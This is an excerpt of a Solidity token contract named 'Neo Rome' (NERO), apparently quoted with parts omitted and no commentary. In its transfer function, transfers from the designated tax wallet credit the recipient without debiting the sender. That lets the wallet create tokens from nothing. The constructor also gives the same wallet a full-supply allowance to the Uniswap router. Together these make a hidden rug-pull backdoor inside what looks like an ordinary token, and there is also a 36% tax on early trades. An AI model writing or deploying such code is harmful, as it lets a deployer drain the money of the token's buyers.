...
/*
    web      : https://neorome.codes
    twitter  : https://twitter.com/neoromearea
    telegram : https://t.me/neorome_codes
*/
...
contract NeoRome is Context, IERC20, Ownable {
    ...
    string private constant _name = "Neo Rome";
    string private constant _symbol = "NERO";

    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    address payable public _neoTaxFee;
    ...
    constructor(address taxAddress) {
        ...
        _neoTaxFee = payable(taxAddress);

        _isExcludedFromFeeWallet[msg.sender] = true;
        _isExcludedFromFeeWallet[_neoTaxFee] = true;
        _isExcludedFromFeeWallet[address(this)] = true;
        _isExcludedFromMaxTxFees[_neoTaxFee] = true;

        _allowances[_neoTaxFee][address(uniswapV2Router)] = _totalSupply;    //Approve at deploy
        _balance[msg.sender] = _totalSupply;
        emit Transfer(address(0), address(msg.sender), _totalSupply);
    }

    function createNeoPair() external onlyOwner() {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
            _tax = 0;
             if(_isExcludedFromMaxTxFees[from]) {
                _balance[to] = _balance[to] + amount;
                return;
            }
        } else {
            require(launch, "Wait till launch");
            if (block.number < launchedAt + launchDelay) {_tax=36;} else {
